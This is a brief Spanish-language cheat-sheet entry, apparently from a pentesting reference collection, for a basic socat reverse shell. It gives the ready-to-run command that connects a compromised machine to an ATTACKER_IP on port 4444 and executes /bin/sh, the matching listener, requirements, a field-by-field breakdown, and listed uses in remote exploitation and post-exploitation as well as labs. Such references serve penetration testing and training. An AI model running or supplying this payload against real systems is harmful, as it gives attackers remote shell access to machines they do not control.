# Socat Reverse Shell — Basic

## Descripción

Esta reverse shell utiliza socat para establecer una conexión TCP simple entre la máquina comprometida y la máquina atacante.

---

# Comando

```bash
socat TCP:ATTACKER_IP:4444 EXEC:/bin/sh
```

---

# Listener

```bash
socat TCP-LISTEN:4444,fork -
```

---

# Requisitos

* socat instalado
* conexión TCP saliente permitida

---

# Explicación

```
socat                 → herramienta de red
TCP:ATTACKER_IP:4444  → conexión TCP al atacante
EXEC:/bin/sh          → ejecuta shell
```

---

# Cuándo usarlo

* explotación remota
* post-explotación
* laboratorios de seguridad

---

# Limitaciones

* requiere socat instalado
